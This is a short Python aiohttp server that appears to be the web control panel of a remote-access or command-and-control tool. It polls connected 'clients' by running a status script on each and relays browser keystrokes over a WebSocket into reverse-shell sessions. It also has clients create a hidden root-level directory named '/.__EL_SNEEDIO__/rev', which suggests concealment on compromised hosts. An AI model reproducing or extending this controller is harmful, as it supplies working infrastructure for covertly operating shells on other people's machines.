#!/usr/bin/env python3

import asyncio
from aiohttp import web
import aiohttp_jinja2
import shared

routes = web.RouteTableDef()

routes.static("/node_modules", "./node_modules")

@routes.get("/")
async def index(request):
    async def x(client):
        return client, client.parse(await client.script("./scripts/status.sh"))
    tasks = [x(client) for client in shared.comm.clients.values()]
    results = await asyncio.gather(*tasks)
    status = dict(results)
    return aiohttp_jinja2.render_template("index.html", request, context={
        "status": status,
        "clients": shared.comm.clients
    })

@routes.get("/rev/{ip}/{port}")
async def rev(request):
    ws = web.WebSocketResponse()
    await ws.prepare(request)
    ip = request.match_info["ip"]
    port = request.match_info["port"]
    token = str(await shared.comm.clients[(ip, int(port))].msg("mkdir -p /.__EL_SNEEDIO__/rev;ls /.__EL_SNEEDIO__/rev &"), "utf8")
    shared.ws_clients[token] = ws

    try:
        async for msg in ws:
            a = msg.data
            if a == '\r': a = '\n'
            shared.rev.clients[token][1].write(bytes(a, "utf8"))
            await shared.rev.clients[token][1].drain()
    finally:
        del shared.ws_clients[token]
        return ws

@routes.get("/shell/{ip}/{port}")
async def shell(request):
    return aiohttp_jinja2.render_template("shell.html", request, context={
        "ip": request.match_info["ip"],
        "port": request.match_info["port"]
    })
